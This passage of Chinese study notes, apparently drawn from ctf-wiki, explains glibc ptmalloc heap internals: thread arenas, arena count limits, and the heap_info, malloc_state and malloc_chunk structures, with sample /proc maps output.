132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3a mmap \u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a 1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709 132KB \u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3a thread arena\u3002 \u6ce8\u610f\uff1a \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e 128KB \u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55 arena \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884c mmap \u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u00b6 \u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55 \u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002 \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002 \u5b8f\u89c2\u7ed3\u6784 \u00b6 32\u4f4d\u5185\u5b58\u5e03\u5c40 \u00b6 \u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4e3a\uff1a\u4e0d\u53ef\u8bbf\u95ee\u7684\u5185\u6838\u7a7a\u95f4\uff0c\u6808\u7a7a\u95f4\uff08\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u751f\u957f\uff09\uff0c\u5185\u5b58\u5e03\u5c40\u533a\uff0c\u5806\u7a7a\u95f4\uff08\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u751f\u957f\uff09\uff0cBSS\uff0c\u6570\u636e\u6bb5\uff0c\u6587\u672c\u6bb5\u3002\u672c\u62a5\u544a\u8ba8\u8bba\u8fdb\u7a0b\u7684\u6808\u7a7a\u95f4\u548c\u5806\u7a7a\u95f4\u7684\u5177\u4f53\u7ed3\u6784\u3002 64\u4f4d\u5185\u5b58\u5e03\u5c40 \u00b6 \u7528\u6237\u7a7a\u95f4\u7684\u5e03\u5c40\u548c32\u4f4d\u5dee\u522b\u5f88\u5c0f\u3002 \u5806\u7ba1\u7406\u4ecb\u7ecd \u00b6 3 \u79cd\u6570\u636e\u7ed3\u6784 \u00b6 \u5728 glibc \u7684 malloc \u4e2d\u9488\u5bf9\u5806\u7ba1\u7406\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u4ee5\u4e0b 3 \u79cd\u6570\u636e\u7ed3\u6784\uff1a heap_info\uff08\u5373Heap Header\uff09\u5bf9\u5e94\u7ba1\u7406 heap malloc_state\uff08\u5373Arena Header\uff09 \u5bf9\u5e94\u7ba1\u7406 area malloc_chunk\uff08\u5373Chunk Header\uff09 \u5bf9\u5e94\u7ba1\u7406 chunk \u8fd9\u91cc\u5806\u7ba1\u7406\u4f1a\u51fa\u73b0\u5728\u591a\u7ebf\u7a0b\uff0c\u4e00\u822cpwn\u9898\u4e0d\u4f1a\u6d89\u53ca\u591a\u7ebf\u7a0b\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u90fd\u662f\u5728 main_area \u4e0a\u64cd\u4f5c\uff0c\u56e0\u6b64\u53ef\u9009\u62e9\u6027\u9605\u8bfb heap_info\u3001malloc_state\u3002 heap_info \u00b6 heap_info: \u5373Heap Header\uff0c\u56e0\u4e3a\u4e00\u4e2a**thread arena**\uff08\u6ce8\u610f\uff1a\u4e0d\u5305\u542b**main thread**\uff09\u53ef\u4ee5\u5305\u542b\u591a\u4e2aheaps\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0c\u5c31\u7ed9\u6bcf\u4e2a heap \u5206\u914d\u4e00\u4e2a heap header\u3002\u90a3\u4e48\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4e00\u4e2athread arena\u4f1a\u5305\u542b\u591a\u4e2a heaps \u5462?\u5728\u5f53\u524d heap \u4e0d\u591f\u7528\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 mmap \u7533\u8bf7\u65b0\u7684\u5806\u7a7a\u95f4\uff0c\u65b0\u7684\u5806\u7a7a\u95f4\u4f1a\u88ab\u6dfb\u52a0\u5230\u5f53\u524dthread arena\u4e2d\uff0c\u4fbf\u4e8e\u7ba1\u7406\u3002 typedef struct _heap_info { mstate ar_ptr ; /* Arena for this heap. */ struct _heap_info * prev ; /* Previous heap. */ size_t size ; /* Current size in bytes. */ size_t mprotect_size ; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad [ -6 * SIZE_SZ & MALLOC_ALIGN_MASK ]; } heap_info ; Arena \u6570\u91cf\u9650\u5236 \u00b6 \u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u65e0\u8bba\u6709\u591a\u5c11\u4e2a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \u5462\uff1f\u7b54\u6848\u662f\u5426\u5b9a\u7684\u3002\u4e8b\u5b9e\u4e0a\uff0c*arena*\u7684\u4e2a\u6570\u662f\u8ddf\u7cfb\u7edf\u4e2d\u5904\u7406\u5668\u6838\u5fc3\u4e2a\u6570\u76f8\u5173\u7684\uff0c\u5982\u4e0b\u8868\u6240\u793a\uff1a systems number of arena 32bits 2 x number of cpu cores + 1 64bits 8 x number of cpu cores + 1 Arena \u7ba1\u7406 \u00b6 \u5047\u8bbe\u6709\u5982\u4e0b\u60c5\u666f\uff1a\u4e00\u53f0\u53ea\u542b\u6709\u4e00\u4e2a\u5904\u7406\u5668\u6838\u5fc3\u7684\u673a\u5668\u5b89\u88c5\u6709 32 \u4f4d\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5176\u4e0a\u8fd0\u884c\u4e86\u4e00\u4e2a\u591a\u7ebf\u7a0b\u5e94\u7528\u7a0b\u5e8f\uff0c\u5171\u542b\u6709 4 \u4e2a\u7ebf\u7a0b\u2014\u2014\u4e3b\u7ebf\u7a0b\u548c\u4e09\u4e2a\u5b50\u7ebf\u7a0b\u3002\u663e\u7136\u7ebf\u7a0b\u4e2a\u6570\u5927\u4e8e\u7cfb\u7edf\u80fd\u7ef4\u62a4\u7684\u6700\u5927 arena \u4e2a\u6570\uff082 x \u6838\u5fc3\u6570 + 1= 3\uff09\uff0c\u90a3\u4e48\u6b64\u65f6 glibc \u7684 malloc \u5c31\u9700\u8981\u786e\u4fdd\u8fd9 4 \u4e2a\u7ebf\u7a0b\u80fd\u591f\u6b63\u786e\u5730\u5171\u4eab\u8fd9 3 \u4e2a arena \uff0c\u90a3\u4e48\u5b83\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462\uff1f \u5f53\u4e3b\u7ebf\u7a0b\u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4e3a\u5b83\u5206\u914d\u4e00\u4e2a main arena \uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u9644\u52a0\u6761\u4ef6\u3002 \u5f53\u5b50\u7ebf\u7a0b 1 \u548c\u5b50\u7ebf\u7a0b 2 \u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c glibc \u5b9e\u73b0\u7684 malloc \u4f1a\u5206\u522b\u4e3a\u6bcf\u4e2a\u5b50\u7ebf\u7a0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 thread arena \u3002\u6b64\u65f6\uff0c\u5404\u4e2a\u7ebf\u7a0b\u4e0e arena \u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u3002\u4f46\u662f\uff0c\u5f53\u7528\u6237\u7ebf\u7a0b 3 \u8c03\u7528 malloc \u7684\u65f6\u5019\u5c31\u51fa\u73b0\u95ee\u9898\u4e86\u3002\u56e0\u4e3a\u6b64\u65f6 glibc \u7684 malloc \u80fd\u7ef4\u62a4\u7684 arena \u4e2a\u6570\u5df2\u7ecf\u8fbe\u5230\u4e0a\u9650\uff0c\u65e0\u6cd5\u518d\u4e3a\u5b50\u7ebf\u7a0b 3 \u5206\u914d\u65b0\u7684 arena \u4e86\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u91cd\u590d\u4f7f\u7528\u5df2\u7ecf\u5206\u914d\u597d\u7684 3 \u4e2a arena \u4e2d\u7684\u4e00\u4e2a\uff08 main arena , arena1 \u6216\u8005 arena2 \uff09\u3002\u90a3\u4e48\u8be5\u9009\u62e9\u54ea\u4e2a arena \u8fdb\u884c\u91cd\u590d\u5229\u7528\u5462\uff1f glibc \u7684 malloc \u9075\u5faa\u4ee5\u4e0b\u89c4\u5219\uff1a \u9996\u5148\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u7528\u7684 arena \uff0c\u5728\u904d\u5386\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u52a0\u9501\u8be5 arena \u3002\u5982\u679c\u6210\u529f\u52a0\u9501\uff08\u8be5 arena \u5f53\u524d\u5bf9\u5e94\u7684\u7ebf\u7a0b\u5e76\u672a\u4f7f\u7528\u5806\u5185\u5b58\u5219\u8868\u793a\u53ef\u52a0\u9501\uff09\uff0c\u6bd4\u5982\u5c06 main arena \u6210\u529f\u9501\u4f4f\uff0c\u90a3\u4e48\u5c31\u5c06 main arena \u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5373\u8868\u793a\u8be5 arena \u88ab\u5b50\u7ebf\u7a0b 3 \u5171\u4eab\u4f7f\u7528\u3002 \u5982\u679c\u6ca1\u80fd\u627e\u5230\u53ef\u7528\u7684 arena \uff0c\u90a3\u4e48\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u7684 malloc \u64cd\u4f5c\u963b\u585e\uff0c\u76f4\u5230\u6709\u53ef\u7528\u7684 arena \u4e3a\u6b62\u3002 \u73b0\u5728\uff0c\u5982\u679c\u5b50\u7ebf\u7a0b 3 \u518d\u6b21\u8c03\u7528 malloc \u7684\u8bdd\uff0c glibc \u7684 malloc \u5c31\u4f1a\u5148\u5c1d\u8bd5\u4f7f\u7528\u6700\u8fd1\u8bbf\u95ee\u7684 arena \uff08\u6b64\u65f6\u4e3a main arena \uff09\u3002\u5982\u679c\u6b64\u65f6 main arena \u53ef\u7528\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\uff0c\u5426\u5219\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u963b\u585e\uff0c\u76f4\u5230 main arena \u518d\u6b21\u53ef\u7528\u4e3a\u6b62\u3002 \u8fd9\u6837\u5b50\u7ebf\u7a0b 3 \u4e0e\u4e3b\u7ebf\u7a0b\u5c31\u5171\u4eab main arena \u4e86\u3002\u81f3\u4e8e\u5176\u4ed6\u66f4\u590d\u6742\u7684\u60c5\u51b5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 malloc_state \u00b6 malloc_state: \u5373Arena Header\uff0c\u7528\u4e8e\u8868\u793a area \u7684\u4fe1\u606f\uff0c\u6bcf\u4e2athread\u53ea\u542b\u6709\u4e00\u4e2aArena Header\u3002Arena Header\u5305\u542bbins\u7684\u4fe1\u606f\u3001top chunk\u4ee5\u53ca\u6700\u540e\u4e00\u4e2aremainder chunk\u7b49(\u8fd9\u4e9b\u6982\u5ff5\u4f1a\u5728\u540e\u6587\u8be6\u7ec6\u4ecb\u7ecd): struct malloc_state { /* Serialize access. */ mutex_t mutex ; /* Flags (formerly in max_fast). */ int flags ; /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top ; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder ; /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; /* Bitmap of bins */ unsigned int binmap [ BINMAPSIZE ]; /* Linked list */ struct malloc_state * next ; /* Linked list for free arenas. */ struct malloc_state * next_free ; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem ; INTERNAL_SIZE_T max_system_mem ; }; malloc_chunk \u00b6 malloc_chunk: \u5373Chunk Header\uff0c\u4e00\u4e2aheap\u88ab\u5206\u4e3a\u591a\u4e2achunk\uff0c\u81f3\u4e8e\u6bcf\u4e2achunk\u7684\u5927\u5c0f\uff0c\u8fd9\u662f\u6839\u636e\u7528\u6237\u7684\u8bf7\u6c42\u51b3\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u7528\u6237\u8c03\u7528malloc(size_t size)\u4f20\u9012\u7684size\u53c2\u6570\u201c\u5c31\u662f\u201dchunk\u7684\u5927\u5c0f(\u8fd9\u91cc\u7ed9\u201c\u5c31\u662f\u201d\u52a0\u4e0a\u5f15\u53f7\uff0c\u8bf4\u660e\u8fd9\u79cd\u8868\u793a\u5e76\u4e0d\u51c6\u786e\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\u5c31\u6682\u65f6\u8fd9\u4e48\u63cf\u8ff0\u4e86\uff0c\u8be6\u7ec6\u8bf4\u660e\u89c1\u540e\u6587)\u3002\u6bcf\u4e2achunk\u90fd\u7531\u4e00\u4e2a\u7ed3\u6784\u4f53malloc_chunk\u8868\u793a\uff1a struct malloc_chunk { /* #define INTERNAL_SIZE_T size_t */ INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. \u8fd9\u4e24\u4e2a\u6307\u9488\u53ea\u5728free chunk\u4e2d\u5b58\u5728*/ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; \u5173\u4e8e\u4e0a\u8ff0\u7684\u7ed3\u6784\uff08malloc_chunk\u4e3b\u7ebf\u7a0b\u4e5f\u7528\u5230\uff09\uff0c\u9488\u5bf9\u5b50\u7ebf\u7a0b\u7684\uff0c\u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u4e00\u4e9b\u4e0d\u540c\uff1a \u4e3b\u7ebf\u7a0b\u7684\u5806\u4e0d\u662f\u5206\u914d\u5728\u5185\u5b58\u6620\u5c04\u533a\uff0c\u800c\u662f\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5806\u533a\uff0c\u56e0\u6b64\u4e0d\u542b\u6709\u591a\u4e2a heap \u6240\u4ee5\u4e5f\u5c31\u4e0d\u542b\u6709 heap_info \u7ed3\u6784\u4f53\u3002\u5f53\u9700\u8981\u66f4\u591a\u5806\u7a7a\u95f4\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u901a\u8fc7\u589e\u957f brk \u6307\u9488\u6765\u83b7\u53d6\u66f4\u591a\u7684\u7a7a\u95f4\uff0c\u76f4\u5230\u5b83\u78b0\u5230\u5185\u5b58\u6620\u5c04\u533a\u57df\uff08mapping\uff09\u4e3a\u6b62\u3002 \u4e0d\u540c\u4e8e thread arena \uff0c\u4e3b\u7ebf\u7a0b\u7684 main arena \u7684 arena header \u5e76\u4e0d\u5728\u5806\u533a\u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u5b83\u5c5e\u4e8e libc.so \u7684 data segment \u533a\u57df\u3002 heap segment\u4e0earena\u5173\u7cfb \u00b6 \u9996\u5148\uff0c\u901a\u8fc7\u5185\u5b58\u5206\u5e03\u56fe\u7406\u6e05malloc_state\u4e0eheap_info\u4e4b\u95f4\u7684\u7ec4\u7ec7\u5173\u7cfb\u3002 \u4e0b\u56fe\u662f\u53ea\u6709\u4e00\u4e2aheap segment\u7684main arena\u548cthread arena\u7684\u5185\u5b58\u5206\u5e03\u56fe\uff1a \u4e0b\u56fe\u662f\u4e00\u4e2athread arena\u4e2d\u542b\u6709\u591a\u4e2aheap segments\u7684\u60c5\u51b5\uff1a \u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0cthread arena\u53ea\u542b\u6709\u4e00\u4e2amalloc_state(\u5373arena header)\uff0c\u5374\u6709\u4e24\u4e2aheap_info(\u5373heap header)\u3002\u7531\u4e8e\u4e24\u4e2aheap segments\u662f\u901a\u8fc7mmap\u5206\u914d\u7684\u5185\u5b58\uff0c\u4e24\u8005\u5728\u5185\u5b58\u5e03\u5c40\u4e0a\u5e76\u4e0d\u76f8\u90bb\u800c\u662f\u5206\u5c5e\u4e8e\u4e0d\u540c\u7684\u5185\u5b58\u533a\u95f4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0clibc malloc\u5c06\u7b2c\u4e8c\u4e2aheap_info\u7ed3\u6784\u4f53\u7684prev\u6210\u5458\u6307\u5411\u4e86\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5373ar_ptr\u6210\u5458\uff09\uff0c\u800c\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684ar_ptr\u6210\u5458\u6307\u5411\u4e86malloc_state\uff0c\u8fd9\u6837\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u65b9\u4fbf\u540e\u7eed\u7ba1\u7406\u3002 \u5fae\u89c2\u7ed3\u6784 \u00b6 chunk \u4ecb\u7ecd \u00b6 \u6982\u8ff0 \u00b6 \u5728 glibc malloc \u4e2d\u5c06\u6574\u4e2a\u5806\u5185\u5b58\u7a7a\u95f4\u5206\u6210\u4e86\u8fde\u7eed\u7684\u3001\u5927\u5c0f\u4e0d\u4e00\u7684 chunk \uff0c\u5373\u5bf9\u4e8e\u5806\u5185\u5b58\u7ba1\u7406\u800c\u8a00 chunk \u5c31\u662f\u6700\u5c0f\u64cd\u4f5c\u5355\u4f4d\u3002 chunk \u603b\u5171\u5206\u4e3a 4 \u5927\u7c7b\uff1a allocated chunk free chunk top chunk last remainder chunk \u4ece\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u6240\u6709\u7c7b\u578b\u7684 chunk \u90fd\u662f\u5185\u5b58\u4e2d\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u53ea\u662f\u901a\u8fc7\u8be5\u533a\u57df\u4e2d\u7279\u5b9a\u4f4d\u7f6e\u7684\u67d0\u4e9b\u6807\u8bc6\u7b26\u52a0\u4ee5\u533a\u5206\u3002\u4e3a\u4e86\u7b80\u4fbf\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9 4 \u5927\u7c7b chunk \u7b80\u5316\u4e3a 2 \u7c7b\uff1a allocated chunk \u4ee5\u53ca free chunk \uff0c\u524d\u8005\u8868\u793a\u5df2\u7ecf\u5206\u914d\u7ed9\u7528\u6237\u4f7f\u7528\u7684 chunk \uff0c\u540e\u8005\u8868\u793a\u672a\u4f7f\u7528\u7684 chunk \u3002 \u4efb\u4f55\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u662f\u4ee5 chunk \u4e3a\u5355\u4f4d\u8fdb\u884c\u5806\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u800c\u8fd9\u5c31\u9700\u8981\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u6765\u6807\u5fd7\u5404\u4e2a\u5757\u7684\u8fb9\u754c\uff0c\u4ee5\u53ca\u533a\u5206\u5df2\u5206\u914d\u5757\u548c\u7a7a\u95f2\u5757\u3002\u5927\u591a\u6570\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u5c06\u8fd9\u4e9b\u8fb9\u754c\u4fe1\u606f\u4f5c\u4e3a chunk \u7684\u4e00\u90e8\u5206\u5d4c\u5165\u5230 chunk \u5185\u90e8\u3002 \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784\uff08malloc_chunk\uff09\u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002 malloc_chunk (allocated chunk) \u00b6 malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b: /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b prev_size \u5982\u679c\u8be5 chunk \u7684**\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740 chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00 chunk \u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f (\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2a chunk \u7684\u6570\u636e\u3002**\u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \u3002 size \u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0 \u8868\u793a\u5c5e\u4e8e\u3002 IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684 P \u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a 1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2 chunk \u4e4b\u95f4\u7684\u5408\u5e76\u3002 fd\uff0cbk chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk 